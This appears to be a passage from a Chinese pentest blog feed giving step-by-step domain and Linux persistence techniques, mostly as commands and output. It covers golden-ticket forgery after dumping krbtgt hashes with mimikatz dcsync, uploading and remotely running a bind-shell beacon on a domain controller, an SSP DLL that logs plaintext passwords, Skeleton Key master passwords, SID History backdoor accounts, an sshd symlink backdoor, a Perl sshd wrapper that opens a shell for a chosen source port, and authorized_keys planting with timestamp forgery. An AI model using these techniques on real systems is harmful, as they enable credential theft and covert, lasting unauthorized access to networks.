        <content type="html"><![CDATA[<p>当我们进入域内的时候，若是域内存在一些漏洞，可以提权为域控还好，若是都打上补丁，那么就比较麻烦，需要留下后门，防止失去我们所获得的域控权限</p><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><blockquote><p>pass the ticket</p></blockquote><h2 id="黄金票据伪造原理（具体查看前面的域内认证流程）"><a href="#黄金票据伪造原理（具体查看前面的域内认证流程）" class="headerlink" title="黄金票据伪造原理（具体查看前面的域内认证流程）"></a>黄金票据伪造原理（具体查看前面的域内认证流程）</h2><blockquote><p>参考前面的文章：<a href="https://11pmsleep.github.io/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/">Windows 密码凭证获取</a></p></blockquote><blockquote><p>2.2 AS确认Client端登录者用户身份</p></blockquote><p>KDC  返回的 Msg B ：使用 TGS 密钥( KDC HASH &#x2F; KRBTGT用户NTLM HASH ) 加密的TGT ( Ticket-Granting-Ticket )，当我们获取到 krbtgt 用户的 NTLM 哈希后，便可主动使用 krbtgt 用户的 NTLM 哈希做为 TGS 密钥来生成 TGT 发送给 KDC ，这样 KDC如果通过解密伪造 TGT 获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY]  可以成功解密 Authenticator 1  并完成与 TGT 中的数据进行比对，便成功骗过了 KDC ，也就是成功伪造了黄金票据</p><h2 id="黄金票据伪造条件"><a href="#黄金票据伪造条件" class="headerlink" title="黄金票据伪造条件"></a>黄金票据伪造条件</h2><ol><li>域名称</li><li>域的SID值</li><li>域的 KRBTGT 账户密码 HASH</li><li>伪造用户名，可以是任意的</li></ol><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ol><li>获取域名称（GUNGNIR.top）</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon</span></span><br><span class="line">shell <span class="built_in">whoami</span></span><br><span class="line"><span class="comment">#gungnir\bob</span></span><br></pre></td></tr></table></figure><ol start="2"><li>域SID</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon</span></span><br><span class="line">shell <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line">用户名      SID                                          </span><br><span class="line">=========== =============================================</span><br><span class="line">gungnir\bob S-1-5-21-4197607899-2616046475-783702130-1106</span><br><span class="line"></span><br><span class="line"><span class="comment">#以查询出的S-1-5-21-4197607899-2616046475-783702130-1106为例</span></span><br><span class="line"><span class="comment">#后面需要填写的域sid：S-1-5-21-4197607899-2616046475-783702130</span></span><br><span class="line"><span class="comment">#域id并不需要携带rid 1006</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：在工作组下面也有SID——安全标识符（<strong>S</strong>ecurity <strong>Id</strong>entify）。为<strong>域</strong>或<strong>本地计算机</strong>中创建的每个帐户分配的唯一 ID 字符串（例如，S-1-5-21-1963647555-2248327119-2118898007-1001）。</p><p>1001就是用户的RID</p></blockquote><ol start="3"><li>域krbtgt账户ntlm hash或aes-256值</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#beacon，使用mimkatz的dcsync模块</span></span><br><span class="line">mimikatz lsadump::dcsync /user:krbtgt@GUNGNIR.top</span><br><span class="line"><span class="comment">#如果hashdump失败，，可能是目标机器运行不了mimikatz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#结果，注意其Hash NTLM</span></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : 2022/6/29 21:48:46</span><br><span class="line">Object Security ID   : S-1-5-21-4197607899-2616046475-783702130-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 5b0d5ce2aca63048b983a26e5c49cec2</span><br><span class="line">    ntlm- 0: 5b0d5ce2aca63048b983a26e5c49cec2</span><br><span class="line">    lm  - 0: 6e2b8af8eb15e14ba4934695725f0e9a</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透——DCSync</a>原理讲解</p></blockquote><ol start="4"><li>清理所有票据</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看所有缓存的票据，klist是系统内置命令</span><br><span class="line">shell klist</span><br><span class="line">#清除</span><br><span class="line">shell klist purge</span><br><span class="line">#或者是使用mimikatz清除</span><br><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure><ol start="5"><li>mimikatz伪造指定用户的票据并注入内存</li></ol><blockquote><p>cs使用图形化界面进行票据伪造</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070105662.png" alt="image-20220907010504250" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070117770.png" alt="image-20220907011700645" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#实际上在beacon中可以观察到，实际上就是调用了mimikatz执行了下面的命令</span><br><span class="line"># /ptt表示pass the hash ，同样我们也可以用mimikatz进行pth操作</span><br><span class="line"></span><br><span class="line">beacon&gt; mimikatz kerberos::golden /user:administrator /domain:gungnir.top /sid:S-1-5-21-4197607899-2616046475-783702130 /krbtgt:5b0d5ce2aca63048b983a26e5c49cec2 /endin:480 /renewmax:10080 /ptt</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s kerberos::golden /user:administrator /domain:gungnir.top /sid:S-1-5-21-4197607899-2616046475-783702130 /krbtgt:5b0d5ce2aca63048b983a26e5c49cec2 /endin:480 /renewmax:10080 /ptt command</span><br><span class="line">[+] host called home, sent: 296050 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">User      : administrator</span><br><span class="line">Domain    : gungnir.top (GUNGNIR)</span><br><span class="line">SID       : S-1-5-21-4197607899-2616046475-783702130</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: 5b0d5ce2aca63048b983a26e5c49cec2 - rc4_hmac_nt      </span><br><span class="line">Lifetime  : 2022/9/7 1:18:30 ; 2022/9/7 9:18:30 ; 2022/9/14 1:18:30</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket for &#x27;administrator @ gungnir.top&#x27; successfully submitted for current session</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#伪造成功</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure><ol start="6"><li>查看票据</li></ol><blockquote><p>注意：</p><p>当用户注销或者是beacon掉线，都会失去票据</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接使用mimikatz查看票据</span></span><br><span class="line">mimikatz kerberos::list</span><br><span class="line"></span><br><span class="line">[00000000] - 0x00000017 - rc4_hmac_nt      </span><br><span class="line">   Start/End/MaxRenew: 2022/9/7 1:18:30 ; 2022/9/7 9:18:30 ; 2022/9/14 1:18:30</span><br><span class="line">   Server Name       : krbtgt/gungnir.top @ gungnir.top</span><br><span class="line">   Client Name       : administrator @ gungnir.top</span><br><span class="line">   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment">#或者beacon上执行</span></span><br><span class="line">shell klist</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;客户端: administrator @ gungnir.top</span></span><br><span class="line">服务器: krbtgt/gungnir.top @ gungnir.top</span><br><span class="line">Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">票证标志 0x40e00000 -&gt; forwardable renewable initial pre_authent </span><br><span class="line">开始时间: 9/7/2022 1:18:30 (本地)</span><br><span class="line">结束时间:   9/7/2022 9:18:30 (本地)</span><br><span class="line">续订时间: 9/14/2022 1:18:30 (本地)</span><br><span class="line">会话密钥类型: RSADSI RC4-HMAC(NT)</span><br></pre></td></tr></table></figure><ol start="7"><li>得到域控shell</li></ol><blockquote><p>伪造成域管理员用户访问域控（普通用户无法访问域控）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#验证是否有权限访问域控</span></span><br><span class="line">shell <span class="built_in">dir</span> \\10.10.10.10\c$</span><br><span class="line"><span class="comment">#上传一个beacon到桌面,可以使用图形化界面explore&gt;file browser,也可以使用命令行。此时需要使用正向shell连接到内网的其他主机，反向shell的不行的</span></span><br><span class="line">upload F:\Haoran\桌面\Trust folder\bind4444.exe (C:\Users\BOB\Desktop\bind4444.exe)</span><br><span class="line"><span class="comment">#上传到域控</span></span><br><span class="line">shell copy C:\Users\BOB\Desktop\bind4444.exe \\10.10.10.10\c$</span><br><span class="line"><span class="comment">#执行，在域控上远程创建进程</span></span><br><span class="line">shell wmic /authority:<span class="string">&quot;kerberos:gungnir.top\DC&quot;</span> /node:<span class="string">&quot;DC&quot;</span> process call create <span class="string">&quot;cmd /c c:\bind4444.exe&quot;</span></span><br><span class="line"><span class="comment">#连接，cs提供connect命令连接tcp beacon</span></span><br><span class="line">connect 10.10.10.10 4444</span><br><span class="line"><span class="comment">#获得域控</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070208271.png" alt="image-20220907020805060"></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209070209153.png" alt="image-20220907020918987" style="zoom:33%;" /><ol start="8"><li>保存票据为文件，直接使用即可</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保存票据文件golden.kirbi</span></span><br><span class="line">mimikatz kerberos::golden /user:administrator /domain:de1ay.com /sid:S<span class="literal">-1-5-21-2756371121-2868759905-3853650604</span> /krbtgt:<span class="number">82</span>dfc71b72a11ef37d663047bc2088fb /ticket:golden.kirbi</span><br></pre></td></tr></table></figure><ol start="9"><li>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</li></ol><blockquote><p>前提是票据没有过期</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入票据</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><h1 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h1><blockquote><p>拿到域控权限后，就可以通过这种方式来维持在域控中的权限，获取密码</p></blockquote><h2 id="SSP简介"><a href="#SSP简介" class="headerlink" title="SSP简介"></a>SSP简介</h2><p>SSP ： Security Support Provider ,一个用于身份验证的 dll。dll是动态链接库，一些公共的库文件，都可以调用<br>SSPI ： Security Support Provider Interface ， Windows  系统在执行认证操作所使用的API。 SSPI 是 SSP 的 API 接口<br>LSA ： Local Security Authority ，用于身份认证，常见进程为 lsass.exe ，特别的地方在于 <strong>LSA 是可扩展的</strong>，在系统启动的时候 SSP 会被加载到进程 lsass.exe中.这相当于我们可以自定义一个 dll ，在系统启动的时候被加载到进程lsass.exe 。</p><blockquote><ul><li>注入到该dll中就可以对该进程进行数据获取和操作</li></ul></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>系统在启动时 SSP  这个dll会被加载到 lsass.exe  进程中,并且由于 lsa 是可扩展的,导致在系统启动时我们可以加载一个自定义的 dll ,一个用于记录所有登录到当前系统的明文账号密码的 dll , 利用 mimikatz  中 mimilib.dll  文件</p><p>将 mimikatz 中的 mimilib.dll  放到系统的 C:\Windows\system32 目录下（DLL的位数需要与windows位数相同），并将 mimilib.dll 添加到注册表中，使用此方法即使系统重启，也不会影响到持久化的效果。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#上传mimilib.dll到system32目录下面</span></span><br><span class="line"><span class="built_in">copy</span> mimilib.dll %systemroot%\system32</span><br><span class="line"><span class="comment">#检验是否上传成功</span></span><br><span class="line">shell <span class="built_in">dir</span> C:\Windows\System32\mimilib.dll</span><br><span class="line"><span class="comment">#查询注册表项值HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa</span></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line"><span class="comment">#添加注册表项值的数据，/d表示数据，/t表示数据类型</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa&quot;</span> /v <span class="string">&quot;Security Packages&quot;</span> /d <span class="string">&quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot;</span> /t REG_MULTI_SZ</span><br><span class="line"><span class="comment">#注：在/d选项中\0类似于空格或者换行，为了使每一项区分开来</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：在powershell中执行reg，在cmd中执行可能会报错</p></blockquote><p>修改前：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071357555.png" alt="image-20220907135736360" style="zoom:33%;" /><p>修改后</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071358312.png" alt="image-20220907135811101" style="zoom:33%;" /><blockquote><p>在注册表中的mimilib.dll文件会指引我们去系统目录下调用相应的dll文件</p></blockquote><p>计算机重启后，如果有用户成功登录到当前系统中,会在 c:\windows\system32  目录下生成一个用于记录登账账号密码的 kiwissp.log  文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071503773.png" alt="image-20220907150312481" style="zoom:33%;" /><blockquote><p>但是呢！？域控机器甚至很多的服务器都是很少有重启的行为啦，因为重启对域内机器的使用影响很大</p><p>下面的方法避免重启操作~~</p></blockquote><ul><li>Memory Updating of SSPs</li></ul><blockquote><p>使用mimikatz将伪造的SSP注入内存，这样做不会在系统中留下二进制文件，但如果域控制器重启，被注入内存的伪造的SSP将会丢失。</p><p>直接注入内存的好处就是不需要操作dll文件以及重启之类的操作，只要用户进行登录就可以记录</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz misc::memssp</span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure><h1 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h1><h2 id="Skeleton-Key简介"><a href="#Skeleton-Key简介" class="headerlink" title="Skeleton Key简介"></a>Skeleton Key简介</h2><ul><li><strong>Skeleton Key是一种不需要域控重启即能生效的维持域控权限方法。</strong> </li><li>Skeleton Key被安装在64位的域控服务器上,支持Windows Server2003—Windows Server2012 R2,能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，重启后失效。</li></ul><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><ul><li>在域控安装Skeleton Key</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><ul><li>域内主机使用Skeleton Key登录域控</li></ul><blockquote><p>mimikatz的默认Skeleton Key设置为mimikatz，Skeleton Key只是给所有账户添加了一个万能密码，无法修改账户的权限</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用万能密码连接，下面两种登录方式都是可以的</span></span><br><span class="line">net use \\DC.de1ay.com mimikatz /user:administrator@gungnir.top</span><br><span class="line">net use \\DC.de1ay.com mimikatz /user:gungnir\administrator</span><br><span class="line"><span class="comment">#检验</span></span><br><span class="line"><span class="built_in">dir</span> \\DC.de1ay.com\c<span class="variable">$</span> </span><br></pre></td></tr></table></figure><blockquote><p>补充：两种登录方式</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209071633372.png" alt="image-20220907163357184" style="zoom: 33%;" /></blockquote><h1 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h1><blockquote><p>SID:Security Identity</p></blockquote><h2 id="SID简介"><a href="#SID简介" class="headerlink" title="SID简介"></a>SID简介</h2><p>每个用户都有自己的SID。SID的作用主要是<strong>跟踪安全主体控制用户连接资源时的访问权限</strong>。(简而言之就是通过SID判断用户访问资源的权限)</p><p>接下来引入一个场景：如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。</p><blockquote><p>SID就相当于权限的标识，失去了SID也就失去了权与力。</p></blockquote><p>如何记住曾经的SID呢？那么就需要用到SID History属性！！</p><p>SID History是在域迁移过程中需要使用的一个<strong>属性</strong>。</p><p>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p><p>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则<strong>可以将SID History作为实现持久化的方法</strong>。</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><blockquote><p>上述原理如何利用呢？简单解释一下:</p><p>域内用户的SID History属性如果其内容是administrator的SID，那么它也将具备administrator的“权与力”！</p><p>我们通过mimikatz将新建的用户的SID History属性改为管理员用户即可实现权限维持~~</p></blockquote><ul><li>域控上添加并启用域账户，之后便可以使用alvin登录域内机器</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-disabled no表示启用</span></span><br><span class="line">dsadd user <span class="string">&quot;cn=alvin,dc=gungnir,dc=top&quot;</span> <span class="literal">-disabled</span> no <span class="literal">-pwd</span> <span class="number">1</span>qaz@WSX1</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">net user </span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080015460.png" alt="image-20220908001506287" style="zoom:50%;" /><ul><li>Mimikatz添加后门</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:alvin /new:administrator</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080026170.png" alt="image-20220908002639046" style="zoom: 50%;" /><ul><li>PowerShell查看alvin用户的SID History</li></ul><blockquote><p>可以清除的看到是域控的SID</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">Get-ADUser</span> alvin <span class="literal">-Properties</span> sidhistory</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080027213.png" alt="image-20220908002725077" style="zoom:50%;" /><ul><li>验证域用户alvin是否有具有administrator权限：</li></ul><blockquote><p>此时我们的alvin用户虽然不在管理员组，但是其具有域控功能</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"><span class="built_in">dir</span> \\DC.gungnir.top\c<span class="variable">$</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209080020451.png" alt="image-20220908002053314" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x31 - Linux权限维持</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><blockquote><p>常见后门方式，隐蔽性也比较高，也很方便进入系统</p></blockquote><h2 id="软链接-sshd"><a href="#软链接-sshd" class="headerlink" title="软链接 sshd"></a>软链接 sshd</h2><blockquote><ul><li><p>类似Windows下面的快捷方式，可以通过访问对应软链接实现访问对应程序的效果，比如python和python3都链接指向python3.9</p></li><li><p>ln命令</p></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    --backup[=CONTROL]  为每个已存在的目标文件创建备份文件</span><br><span class="line">-b        类似--backup，但不接受任何参数</span><br><span class="line">-d, -F, --directory   创建指向目录的硬链接(只适用于超级用户)</span><br><span class="line">-f, --force     强行删除任何已存在的目标文件</span><br><span class="line">-i, --interactive           覆盖既有文件之前先询问用户；</span><br><span class="line">-L, --logical               取消引用作为符号链接的目标</span><br><span class="line">-n, --no-dereference        把符号链接的目的目录视为一般文件；</span><br><span class="line">-P, --physical              直接将硬链接到符号链接</span><br><span class="line">-r, --relative              创建相对于链接位置的符号链接</span><br><span class="line">-s, --symbolic              对源文件建立符号链接，而非硬链接；</span><br><span class="line">-S, --suffix=SUFFIX         用<span class="string">&quot;-b&quot;</span>参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它；</span><br><span class="line">-t, --target-directory=DIRECTORY  指定要在其中创建链接的DIRECTORY</span><br><span class="line">-T, --no-target-directory   将“LINK_NAME”视为常规文件</span><br><span class="line">-v, --verbose               打印每个链接文件的名称</span><br><span class="line">    --<span class="built_in">help</span>    显示此帮助信息并退出</span><br><span class="line">    --version   显示版本信息并退出</span><br></pre></td></tr></table></figure></blockquote></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="comment">#将目录/usr/sbin下的文件sshd链接到目录/tmp下的文件su</span></span><br><span class="line"><span class="comment">#/tmp/su -oport=12345表示以sshd开启了一个12345的端口，表示在12345端口有个ssh服务。可以通过此端口以ssh连接主机</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">ssh root@192.168.78.19 -p 12345</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验端口启动</span></span><br><span class="line">netstat -anlp | grep 12345</span><br><span class="line"><span class="comment">#检查su进程</span></span><br><span class="line">ps -elf | grep su</span><br></pre></td></tr></table></figure><p>输入任意密码就可以root用户权限登陆，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@ip -p 12345<span class="comment">#ssh以指定端口登录对面机器，输入任意密码即可登录</span></span><br></pre></td></tr></table></figure><blockquote><p>注：为什么产生这种现象，参考：<a href="https://www.cnblogs.com/likaiming/p/11007919.html">Linux的一个后门引发对PAM的探究</a></p></blockquote><h2 id="SSH-Server-Wrapper"><a href="#SSH-Server-Wrapper" class="headerlink" title="SSH Server Wrapper"></a>SSH Server Wrapper</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="built_in">cd</span> /usr/sbin</span><br><span class="line"><span class="built_in">mv</span> sshd ../bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..LF/);&#x27;</span> </span><br><span class="line">&gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">chmod</span> u+x sshd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.78.37:22,sourceport=19526</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333280.png" alt="image-20220821233322129"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333898.png" alt="image-20220821233342782"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中`x00x00LF`是19526的大端形式，便于传输和处理。如果你想修改源端口，</span></span><br><span class="line">可以用python的struct标准库实现</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">16714</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">AJ</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212334709.png" alt="image-20220821233416497"></p><ul><li>原理:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则</span><br><span class="line">匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。</span><br><span class="line">原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。</span><br><span class="line">这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这</span><br><span class="line">样子控制权又回到脚本了。</span><br><span class="line">此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的</span><br><span class="line">TCP源端口，如果是19526就执行sh给个shell。</span><br><span class="line">来自https://www.anquanke.com/post/id/155943#h2-9</span><br></pre></td></tr></table></figure><h2 id="SSH-Key"><a href="#SSH-Key" class="headerlink" title="SSH Key"></a>SSH Key</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成私钥和公钥：</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment">#会在当前用户目录的.ssh目录下面生成一对公私钥</span></span><br><span class="line"><span class="comment">#把公钥id_rsa.pub发送到目标上,并修改目标主机上的文件：</span></span><br><span class="line">vim /root/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#连接用户</span></span><br><span class="line">ssh root@ip</span><br><span class="line"><span class="comment">#更改时间：</span></span><br><span class="line"><span class="built_in">touch</span> -r：&lt;参考文件或目录&gt;  <span class="comment">#把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span></span><br><span class="line"><span class="comment">#如把authorized_keys的时间换成known_hosts的时间</span></span><br><span class="line"><span class="built_in">touch</span> -r known_hosts authorized_keys</span><br><span class="line"><span class="comment">#重启ssh服务：</span></span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><h3 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h3><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208272057217.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote><h2 id="SSH-Keylogger键盘记录"><a 